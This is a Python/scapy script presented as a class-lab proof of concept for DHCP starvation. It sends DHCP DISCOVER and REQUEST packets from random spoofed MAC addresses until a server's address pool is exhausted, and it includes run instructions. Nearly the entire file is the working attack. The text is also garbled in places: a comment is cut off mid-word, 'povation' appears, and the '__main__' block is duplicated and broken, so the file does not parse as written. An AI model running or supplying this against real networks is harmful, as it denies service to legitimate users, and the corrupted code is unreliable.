#!/usr/bin/env python3
"""
Minimal DHCP starvation PoC for a CLASS LAB on a network you own/control.
Sends DHCPDISCOVER from random spoofed MACs and completes the DORA handshake
(REQUEST) so each lease actually lands in the server's binding table.

Run as root/Administrator:   sudo python3 dhcp_starve.py eth0
Then on the Cisco router:     show ip dhcp binding
Stops when the pool stops offering addresses (starvation reached).
"""

import sys
import random
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP, sendp, srp1, conf, get_if_raw_hwaddr
)

def rand_mac():
    # Locally-adminis
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def mac_to_bytes(mac):
    return bytes(int(b, 16) for b in mac.split(":"))

def starve(iface, max_leases=254):
    conf.iface = iface
    conf.checkIPaddr = False  # replies come from 0.0.0.0 at this stage; don't filter on IP
    taken = 0

    for _ in range(max_leases):
        src_mac = rand_mac()
        xid = random.randint(1, 0xFFFFFFFF)
        chaddr = mac_to_bytes(src_mac)

         # ---- DHCPDISCOVER (broadcast) ----
        discover = (
            Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), "end"])
        )

        offer = srp1(discover, iface=iface, timeout=3, verbose=0)
        if offer is None:
            print("[*] No OFFER received — povation reached.")
            break

        offered_ip = offer[BOOTP].yiaddr
        server_id = next(
            (o[1] for o in offer[DHCP].option
             if isinstance(o, tuple) and o[0] == "server_id"),
            offer[IP].src,
        )

        # ---- DHCPREQUEST (claim the offered address) ----
        request = (
            Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
            DHCP(options=[
                ("message-type", "request"),
                ("server_id", server_id),
                ("requested_addr", offered_ip),
                "end",
            ])
        )
        sendp(request, iface=iface, verbose=0)
        taken += 1
        print(f"[+] Leased {offered_ip:<15} as {src_mac}  (total: {taken})")

    print(f"\n[*] Done. {taken} addresses pulled from the pool.")
    print("    Check the router now:  show ip dhcp binding")

if __name__ == "__main__":
    if len(sys.argv) != 2:

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(f"Usage: sudo python3 {sys.argv[0]} <interface>   e.g. eth0")
    starve(sys.argv[1])
